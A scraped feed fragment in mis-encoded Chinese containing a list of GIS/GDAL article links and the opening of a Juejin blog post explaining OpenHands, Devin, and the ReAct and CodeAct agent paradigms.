<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FlEqKlTbHKzJ25XsIX6CBuw" target="_blank" title="https://mp.weixin.qq.com/s/lEqKlTbHKzJ25XsIX6CBuw" ref="nofollow noopener noreferrer">ã€Šäº‘å—çœåŠ å¿«æ„å»ºç°ä»£åŒ–äº§ä¸šä½“ç³»æ¨è¿›äº§ä¸šå¼ºçœå»ºè®¾è¡ŒåŠ¨è®¡åˆ’ã€‹å‘å¸ƒ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F8ZDl_-gzCVWrvGAe-VNe8Q" target="_blank" title="https://mp.weixin.qq.com/s/8ZDl_-gzCVWrvGAe-VNe8Q" ref="nofollow noopener noreferrer">ArcGIS Pro æ·»åŠ åº•å›¾çš„æ–¹å¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FE9BrT9VzidvziCayXgRCQA" target="_blank" title="https://mp.weixin.qq.com/s/E9BrT9VzidvziCayXgRCQA" ref="nofollow noopener noreferrer">ä¸ºä»€ä¹ˆæ¯æ¬¡æ‰“å¼€ ArcGIS Pro é¡µé¢åŠ è½½éƒ½å¦‚æ­¤ç¼“æ…¢ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FutAlI_LUDTwMiHOxzu2hDw" target="_blank" title="https://mp.weixin.qq.com/s/utAlI_LUDTwMiHOxzu2hDw" ref="nofollow noopener noreferrer">ArcGIS æ³¢æ®µåˆæˆæ“ä½œ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQVFiW5C5wXQ6a1WODCaH0g" target="_blank" title="https://mp.weixin.qq.com/s/QVFiW5C5wXQ6a1WODCaH0g" ref="nofollow noopener noreferrer">è‡ªç„¶èµ„æºéƒ¨å…šç»„å…³äºè‹—æ³½ç­‰4ååŒå¿—èŒåŠ¡ä»»å…çš„é€šçŸ¥</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FJmv3J_bjbBG-4jB72zS3hw" target="_blank" title="https://mp.weixin.qq.com/s/Jmv3J_bjbBG-4jB72zS3hw" ref="nofollow noopener noreferrer">GDAL åˆ›å»ºçŸ¢é‡å›¾å±‚çš„ä¸¤ç§æ–¹å¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FwkHv2NnJfuPhtyjJcFLrEQ" target="_blank" title="https://mp.weixin.qq.com/s/wkHv2NnJfuPhtyjJcFLrEQ" ref="nofollow noopener noreferrer">GDAL å®ç°çŸ¢é‡æ•°æ®è½¬æ¢å¤„ç†ï¼ˆå…¨ï¼‰</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FMZIQ57Ka3NQfKFi9AuEQEg" target="_blank" title="https://mp.weixin.qq.com/s/MZIQ57Ka3NQfKFi9AuEQEg" ref="nofollow noopener noreferrer">GDAL å®ç°æŠ•å½±è½¬æ¢</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fz_naHKef17txAV2l30zCvg" target="_blank" title="https://mp.weixin.qq.com/s/z_naHKef17txAV2l30zCvg" ref="nofollow noopener noreferrer">GDAL å®ç°çŸ¢é‡åˆå¹¶</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FSX2u2ww1iNOtqR5m3BE93g" target="_blank" title="https://mp.weixin.qq.com/s/SX2u2ww1iNOtqR5m3BE93g" ref="nofollow noopener noreferrer">å›½äº§ç‰ˆçš„Google Earthï¼Œå‰æ—ä¸€å·å«æ˜ŸAppâ€œå…±ç”Ÿåœ°çƒâ€æ¥äº†</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FfWufqSyplniNj4Q3BRRbAQ" target="_blank" title="https://mp.weixin.qq.com/s/fWufqSyplniNj4Q3BRRbAQ" ref="nofollow noopener noreferrer">2026å¹´å…¨å›½è‡ªç„¶èµ„æºå·¥ä½œä¼šè®®å¬å¼€</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FuI-pb6NHVIQQBn84zgbVzQ" target="_blank" title="https://mp.weixin.qq.com/s/uI-pb6NHVIQQBn84zgbVzQ" ref="nofollow noopener noreferrer">GDAL å®ç°çŸ¢é‡è£å‰ª</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F4l8z3pCgtMA7mgDV2-SSfA" target="_blank" title="https://mp.weixin.qq.com/s/4l8z3pCgtMA7mgDV2-SSfA" ref="nofollow noopener noreferrer">GDAL å®ç°ç©ºé—´åˆ†æ</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Agentæ¡†æ¶æ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ2ï¼‰--- CodeActè®ºæ–‡]]></title>    <link>https://juejin.cn/post/7597640029574545459</link>    <guid>https://juejin.cn/post/7597640029574545459</guid>    <pubDate>2026-01-21T13:28:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597640029574545459" data-draft-id="7596181746061541403" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Agentæ¡†æ¶æ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ2ï¼‰--- CodeActè®ºæ–‡"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-21T13:28:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç½—è¥¿çš„æ€è€ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/351470467691175"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Agentæ¡†æ¶æ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ2ï¼‰--- CodeActè®ºæ–‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/351470467691175/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç½—è¥¿çš„æ€è€ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T13:28:32.000Z" title="Wed Jan 21 2026 13:28:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»34åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">AI Agentæ¡†æ¶æ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ2ï¼‰--- CodeActè®ºæ–‡</h2>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x00 æ¦‚è¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x01 èƒŒæ™¯çŸ¥è¯†</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.1 Devin &amp; OpenHandsï¼ˆåŸOpenDevinï¼‰</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.2 CodeAct çš„æ„ä¹‰</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x02 è®¾è®¡æ€è·¯</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.1 ReAct èŒƒå¼</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.2 CodeAct èŒƒå¼</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.3 Python-useèŒƒå¼</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.4 CodeAct vs ReAct</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.5 CodeAct vs å‡½æ•°è°ƒç”¨</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.6 ReCode èŒƒå¼</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0xFF å‚è€ƒ</a></p>
</li>
</ul>
<h3 data-id="heading-1">0x00 æ¦‚è¦</h3>
<p>CodeAct æ˜¯ OpenHands çš„åŸºçŸ³ã€‚</p>
<p>CodeAct =ã€Œç”¨å¯æ‰§è¡Œä»£ç åšä¸€åˆ‡ Actionã€ï¼ŒæŠŠå¯æ‰§è¡Œä»£ç å½“ä½œæœ€æ ¸å¿ƒçš„è¡ŒåŠ¨ï¼ˆActionï¼‰å½¢æ€ï¼Œè®© LLM ç”¨â€˜å†™ä»£ç -è·‘ä»£ç -çœ‹ç»“æœâ€™çš„å¾ªç¯ï¼Œæ›¿ä»£ä¼ ç»Ÿæ–‡æœ¬æˆ– JSON å¼å·¥å…·è°ƒç”¨ï¼Œä»¥è¿›ä¸€æ­¥å®Œæˆå¤æ‚ä»»åŠ¡çš„æ‰‹æ®µã€‚â€æŠŠ LLM ä»â€œæ–‡æœ¬äº¤äº’â€å‡çº§ä¸ºâ€œè„šæœ¬äº¤äº’â€ï¼Œè®©åé¦ˆé—­ç¯ã€å·¥å…·ç»Ÿä¸€ã€æ¨ç†å¤–åŒ–ã€æ‰©å±•æ— æ‘©æ“¦ã€‚</p>
<p>å¦å¤–ï¼ŒManus ä¹Ÿä½¿ç”¨äº† CodeActã€‚</p>
<p>å¸Œæœ›é€šè¿‡æœ¬æ–‡ï¼Œè¯»è€…å¯ä»¥äº†è§£ReActï¼ŒCodeAct è¿™ä¸¤ç§èŒƒå¼ï¼ŒåŸºäºæ­¤ï¼Œå¯ä»¥å¯¹ OpenHands åšè¿›ä¸€æ­¥å­¦ä¹ ã€‚</p>
<p>å› ä¸ºæœ¬ç³»åˆ—å€Ÿé‰´çš„æ–‡ç« è¿‡å¤šï¼Œå¯èƒ½åœ¨å‚è€ƒæ–‡çŒ®ä¸­æœ‰é—æ¼çš„æ–‡ç« ï¼Œå¦‚æœæœ‰ï¼Œè¿˜è¯·å¤§å®¶æŒ‡å‡ºã€‚</p>
<h3 data-id="heading-2">0x01 èƒŒæ™¯çŸ¥è¯†</h3>
<h4 data-id="heading-3">1.1 Devin &amp; OpenHandsï¼ˆåŸOpenDevinï¼‰</h4>
<p>â€ŒDevinæ˜¯ç”±Cognition AIå¼€å‘çš„å…¨çƒé¦–ä¸ªAIç¨‹åºå‘˜ï¼Œå…·å¤‡å…¨æ ˆå¼€å‘èƒ½åŠ›ï¼Œèƒ½è‡ªä¸»å®Œæˆä»£ç ç¼–å†™ã€è°ƒè¯•ã€éƒ¨ç½²åŠAIæ¨¡å‹è®­ç»ƒç­‰ä»»åŠ¡â€Œã€‚Devin ä»£è¡¨äº†ä¸€ç§å…ˆè¿›çš„è‡ªä¸»ä»£ç†ï¼Œæ—¨åœ¨åº”å¯¹è½¯ä»¶å·¥ç¨‹çš„å¤æ‚æ€§ã€‚å®ƒåˆ©ç”¨äº†è¯¸å¦‚ shellã€ä»£ç ç¼–è¾‘å™¨å’Œç½‘ç»œæµè§ˆå™¨ç­‰å·¥å…·çš„ç»„åˆï¼Œå±•ç¤ºäº† LLM åœ¨è½¯ä»¶å¼€å‘ä¸­æœªè¢«å……åˆ†åˆ©ç”¨çš„æ½œåŠ›ã€‚</p>
<p>OpenDevin é¡¹ç›®è¯ç”Ÿäºå¤åˆ¶ã€å¢å¼ºå¹¶åˆ›æ–°åŸå§‹ Devin æ¨¡å‹çš„æ„¿æœ›ã€‚OpenDevin çš„ç›®æ ‡æ˜¯æ¢ç´¢å¹¶æ‰©å±• Devin çš„èƒ½åŠ›ï¼Œè¯†åˆ«å…¶ä¼˜åŠ¿å’Œæ”¹è¿›é¢†åŸŸï¼Œä»¥æŒ‡å¯¼å¼€æ”¾ä»£ç æ¨¡å‹çš„è¿›å±•ã€‚é€šè¿‡å¸å¼•å¼€æºç¤¾åŒºçš„å‚ä¸ï¼ŒOpenDevin æ—¨åœ¨åº”å¯¹ Code LLM åœ¨å®é™…åœºæ™¯ä¸­é¢ä¸´çš„æŒ‘æˆ˜ï¼Œäº§å‡ºå¯¹ç¤¾åŒºæœ‰é‡å¤§è´¡çŒ®çš„ä½œå“ï¼Œå¹¶ä¸ºæœªæ¥çš„è¿›æ­¥é“ºå¹³é“è·¯ã€‚</p>
<p>OpenHands ç›®å‰ GitHub æ˜Ÿæ ‡æ•°å·²è¶… 6.5 ä¸‡ã€‚</p>
<h4 data-id="heading-4">1.2 CodeAct çš„æ„ä¹‰</h4>
<p>åœ¨è‡ªç„¶è¯­è¨€å¤„ç†é¢†åŸŸï¼Œå¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰å·²ç»å–å¾—äº†å®æ‰“å®çš„çªç ´ â€”â€” å®ƒä»¬ä¸æ­¢å¤„ç†æ–‡æœ¬ï¼Œè¿˜èƒ½è°ƒç”¨ APIã€ç®¡ç†å†…å­˜ï¼Œç”šè‡³æ§åˆ¶æœºå™¨äººã€‚ä½†ä¼ ç»Ÿçš„ LLM ä»£ç†æœ‰ä¸ªé—®é¢˜ï¼šå®ƒä»¬é€šå¸¸æ˜¯ç”Ÿæˆ JSON æˆ–è€…å›ºå®šæ ¼å¼çš„æ–‡æœ¬æ¥è¯´æ˜è¦åšä»€ä¹ˆï¼Œè¿™å°±å¯¼è‡´èƒ½åšçš„åŠ¨ä½œæœ‰é™ï¼Œä¹Ÿä¸å¤Ÿçµæ´»ã€‚</p>
<p>CodeAct æ˜¯ä¸€ç§æ–°çš„ä»£ç†æ¡†æ¶ï¼Œå®ƒè®© LLM ç›´æ¥ç”Ÿæˆå¯æ‰§è¡Œçš„ Python ä»£ç æ¥ â€œåšäº‹â€ï¼Œå³ä»¥ code ä¸º actionï¼Œç”¨ä»£ç è§£å†³å¤æ‚é—®é¢˜ã€‚ç®€å•è¯´ï¼ŒLLM å†™ä¸€æ®µ Python ä»£ç ï¼Œè€Œ CodeAct é‡Œé›†æˆäº† Python è§£é‡Šå™¨ï¼Œèƒ½ç›´æ¥è¿è¡Œè¿™æ®µä»£ç ï¼›è€Œä¸”åœ¨å¤šè½®äº¤äº’ä¸­ï¼ŒLLM è¿˜èƒ½å¤„ç†å’Œå­˜å‚¨ä¸­é—´ç»“æœï¼Œæ ¹æ®æ–°çš„ç»“æœè°ƒæ•´ä»£ç ï¼Œç›¸å½“äºç”¨ Python ä»£ç ç»Ÿä¸€äº† LLM ä»£ç†çš„ â€œè¡ŒåŠ¨æ–¹å¼â€ã€‚å½“ç„¶ï¼Œå†™ä»£ç ä¸æ˜¯ç›®çš„ï¼Œè€Œæ˜¯ç”¨è¿™ç§é€šç”¨çš„æ–¹å¼è§£å†³å„ç§é—®é¢˜ã€‚è¿™ç§æ¡†æ¶å…‹æœäº†ä¼ ç»ŸLLMä»£ç†çš„å¤šä¸ªé™åˆ¶ã€‚</p>
<p>å…·ä½“å±•å¼€ï¼ŒCodeAct æœ‰å››ä¸ªé²œæ˜ç‰¹å¾ï¼š</p>
<ul>
<li>ç»Ÿä¸€è¡ŒåŠ¨ç©ºé—´ï¼šæ–‡æœ¬ã€JSONã€å‡½æ•°è°ƒç”¨ã€Shellã€SQLã€ç»˜å›¾ã€ç½‘é¡µæŠ“å–ç­‰ï¼Œå…¨éƒ¨æ”¶æ•›æˆä¸€æ®µ Pythonï¼ˆæˆ–å…¶ä»–è¯­è¨€ï¼‰ä»£ç ï¼›æ¨¡å‹åªéœ€ä¼šå†™ä»£ç ï¼Œå°±èƒ½å®Œæˆå¤šæ¨¡æ€ã€å¤šå·¥å…·ã€å¤šæ­¥éª¤ä»»åŠ¡ï¼Œæ— éœ€è®°å¿†äº”èŠ±å…«é—¨çš„ API å‚æ•°æ ¼å¼ã€‚</li>
<li>é—­ç¯åé¦ˆæœºåˆ¶ï¼šä»£ç è¢«è§£é‡Šå™¨ï¼ˆæˆ–æ²™ç®±ï¼‰çœŸæ­£æ‰§è¡Œï¼Œæ ‡å‡†è¾“å‡ºã€æŠ¥é”™ã€å¼‚å¸¸æ ˆã€è¿è¡Œæ—¶é—´ã€ç”Ÿæˆçš„æ–‡ä»¶/å›¾ç‰‡/è¡¨ç»“æ„ç­‰ï¼Œä¼šåŸæ ·è¿”å›ç»™æ¨¡å‹å½“ä½œä¸‹ä¸€æ­¥ promptçš„éƒ¨åˆ†å†…å®¹ï¼›æ¨¡å‹å¯ç«‹å³â€œçœ‹è§â€è‡ªå·±è¡ŒåŠ¨çš„åæœï¼Œå½¢æˆã€Œå†™-è·‘-çœ‹-æ”¹ã€çš„å¼ºåŒ–å¾ªç¯ï¼Œæ˜¾è‘—é™ä½å¹»è§‰ã€‚</li>
<li>å¤æ‚æ¨ç†å¤–åŒ–ï¼šå¤šæ­¥æ•°å­¦æ¨å¯¼ã€è¡¨æ ¼åˆå¹¶ã€ç»Ÿè®¡æ£€éªŒã€è¿­ä»£ä¼˜åŒ–ç­‰ï¼Œä¸å¿…åœ¨éšçŠ¶æ€é‡Œâ€œå¿ƒç®—â€ï¼Œè€Œæ˜¯å¤–åŒ–ä¸ºå¯è¯»å¯æ”¹çš„ä»£ç ï¼›äººç±»ç”¨æˆ·ä¹Ÿèƒ½å¤æŸ¥ã€æ–­ç‚¹ã€è°ƒè¯•ï¼Œè§£é‡Šæ€§è¿œé«˜äºé»‘ç›’ Chain-of-Thoughtã€‚</li>
<li>é›¶é¢å¤–æ¥å£æˆæœ¬ï¼šä¼ ç»Ÿ Agent æ¯æ¥å…¥ä¸€ä¸ªæ–°èƒ½åŠ›å°±è¦å°è£…ä¸€å¥— JSON Schema/Tool Descriptionï¼›CodeAct ä¾§åªéœ€åœ¨æ²™ç®±é‡Œé¢„è£…å¯¹åº”åº“ï¼ˆmatplotlibã€pandasã€requestsã€seleniumâ€¦ï¼‰ï¼Œæ¨¡å‹ç«‹åˆ»å¯ç”¨ï¼Œæ‰©å±•æˆæœ¬è¶‹è¿‘äºé›¶ã€‚</li>
</ul>
<h3 data-id="heading-5">0x02 è®¾è®¡æ€è·¯</h3>
<p>ä¸åŒçš„Agentæ¡†æ¶å…¶å®æ˜¯ä¸åŒä½œè€…è®¾è®¡æ€è·¯çš„ä½“ç°ï¼Œå¯¹â€œæ™ºèƒ½â€æœ¬è´¨çš„ä¸åŒç†è§£ã€‚è¿™äº›æ¡†æ¶åœ¨æ¨¡å—æ‹†è§£æ–¹å¼ã€ä»»åŠ¡æ§åˆ¶é€»è¾‘ã€æ‰§è¡Œæµç¨‹è®¾è®¡ä¸Šå·®å¼‚æ˜¾è‘—ï¼Œä½“ç°äº†ä¸åŒçš„æŠ€æœ¯æ€è·¯ä¸è®¾è®¡å“²å­¦ï¼Œé€‚ç”¨äºä¸åŒçš„åº”ç”¨åœºæ™¯ã€‚</p>
<ul>
<li>æ¯”å¦‚å¯ä»¥åªæä¾›å°‘æ•°èƒ½åŠ›ï¼Œ åªç»™å‡ºå¤§è‡´æ­¥éª¤ï¼ˆpromptæ¯”è¾ƒç®€å•ï¼Œåªç»™å‡ºå¤§è‡´æ­¥éª¤ï¼‰ï¼Œä¸è¿›è¡Œå¼ºåˆ¶å’Œä¸¥æ ¼çš„é™åˆ¶ï¼Œè®©æ¨¡å‹å¯ä»¥çµæ´»æ¢ç´¢ï¼Œè®©æ¨¡å‹è‡ªä¸»å†³å®šè§£å†³æµç¨‹ã€‚</li>
<li>ä¹Ÿå¯ä»¥é€šè¿‡ç²¾å·§çš„Prompt Engineeringæä¾›å¤æ‚æŒ‡ä»¤ï¼Œè®© Agent èƒ½å¤Ÿè¿›è¡Œæ·±åº¦æ€è€ƒã€å¤šè½®å¯¹è¯ã€è°ƒç”¨å·¥å…·ä»¥åŠé•¿æœŸè®°å¿†ç­‰æ“ä½œï¼Œä»è€Œæå‡æ„ŸçŸ¥å’Œè¡ŒåŠ¨çš„æ™ºèƒ½æ°´å¹³ã€‚</li>
<li>åˆæ¯”å¦‚ï¼ŒPocket Flowçš„ä½œè€…Zachary Huangåšå£«è®¤ä¸ºï¼ŒLLMæ¡†æ¶æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªç®€å•çš„æœ‰å‘å›¾ã€‚</li>
<li>ä¹Ÿæœ‰äººè®¤ä¸ºï¼Œæ„å»ºä¸€ä¸ªæœ‰ç”¨çš„Agentï¼Œå¹¶éæºäºæ¨¡å‹æ™ºåŠ›çš„é£è·ƒï¼Œè€Œæ˜¯æºäºå¦‚ä½•å›´ç»•æ¨¡å‹è®¾è®¡ä¸€å¥—è¡Œä¹‹æœ‰æ•ˆçš„ã€Œè®¤çŸ¥æµç¨‹ã€ã€‚</li>
</ul>
<h4 data-id="heading-6">2.1 ReAct èŒƒå¼</h4>
<p><strong>æ¶æ„å…¨ç§°</strong>ï¼šReasoningï¼ˆæ¨ç†ï¼‰+ Actingï¼ˆè¡ŒåŠ¨ï¼‰ã€‚</p>
<p>äººè§£å†³å¤æ‚é—®é¢˜çš„èªæ˜ä¹‹å¤„ï¼Œå¾€å¾€æ˜¯ â€œæƒ³æ¸…æ¥šå†åŠ¨æ‰‹â€â€”â€” æ‹¿åˆ°éœ€æ±‚å…ˆæ‹†è§£å¼€ã€åˆ†ææ˜ç™½ï¼Œæœ‰äº†æ¸…æ™°æ€è·¯å†è¡ŒåŠ¨ã€‚ReAct èŒƒå¼å°±æ˜¯æŠŠè¿™ç§äººç±»çš„æ€è€ƒæ–¹å¼æ•™ç»™ AI ä»£ç†ï¼Œæ‰“ç ´äº†ä»¥å‰ â€œè¾“å…¥å•¥å°±è¾“å‡ºå•¥â€ çš„é»‘ç®±æ¨¡å¼ï¼Œè®©æ¯ä¸€æ­¥è¡ŒåŠ¨éƒ½èƒ½æŸ¥åˆ°æ€è€ƒè¿‡ç¨‹ã€‚ å³ReAct è®©Agentå­¦ä¼š â€œä¸‰æ€è€Œåè¡Œâ€ã€‚</p>
<h5 data-id="heading-7">2.1.1 æµç¨‹</h5>
<p>ReAct (Reason + Act) æ˜¯ä¸€ç§æ ‡å‡†çš„â€œä¸‰æ­¥èµ°â€èŠ‚æ‹ï¼Œå®ƒè§£å†³äº†æ¨¡å‹è¦ä¹ˆåªä¼šç©ºæƒ³ã€è¦ä¹ˆåªä¼šç›²åŠ¨çš„éš¾é¢˜ï¼Œå®ƒè®©æ¨¡å‹ä¸å†ä¸€æ¬¡æ€§è¾“å‡ºæœ€ç»ˆç­”æ¡ˆï¼Œè€Œæ˜¯å¾ªç¯æ‰§è¡Œä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li><strong>Thoughtï¼ˆæ€è€ƒï¼‰</strong> ï¼šæ¨¡å‹åˆ†æå½“å‰æƒ…å†µï¼Œå†³å®šä¸‹ä¸€æ­¥åšä»€ä¹ˆã€‚</li>
<li><strong>Actionï¼ˆè¡ŒåŠ¨ï¼‰</strong> ï¼šæ¨¡å‹ç”Ÿæˆå·¥å…·è°ƒç”¨æŒ‡ä»¤ï¼ˆFunction Callï¼‰ã€‚</li>
<li><strong>Observationï¼ˆè§‚å¯Ÿï¼‰</strong> ï¼šè¿è¡Œæ—¶ç¯å¢ƒæ‰§è¡Œå·¥å…·ï¼Œå¹¶å°†ç»“æœï¼ˆOutputï¼‰åé¦ˆç»™æ¨¡å‹ã€‚</li>
</ol>
